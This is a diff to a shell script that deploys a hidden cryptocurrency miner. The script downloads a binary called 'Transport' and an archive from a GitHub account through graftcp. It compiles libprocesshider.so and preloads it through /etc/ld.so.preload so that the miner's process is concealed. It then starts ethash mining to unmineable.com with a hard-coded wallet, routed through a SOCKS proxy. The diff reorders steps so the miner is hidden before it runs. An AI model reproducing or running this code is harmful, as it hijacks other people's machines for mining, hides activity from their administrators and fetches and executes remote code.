@@ -39,10 +39,7 @@ echo " "
 echo " "
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
-chmod +x Transport
-ph add Transport
 
-sleep 9
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -51,5 +48,9 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+sleep 3
+chmod +x Transport
+ph add Transport
+
 
 ./graftcp/graftcp  ./Transport -a ethash -o ethash.unmineable.com:3333 -u BABYDOGE:0x8fb54cceed6253b674c557210d8d23c29fb49e74.bot -p x -w Trans --no-sni  --proxy 38.35.237.27:1080 --dns-https-server 1.1.1.1
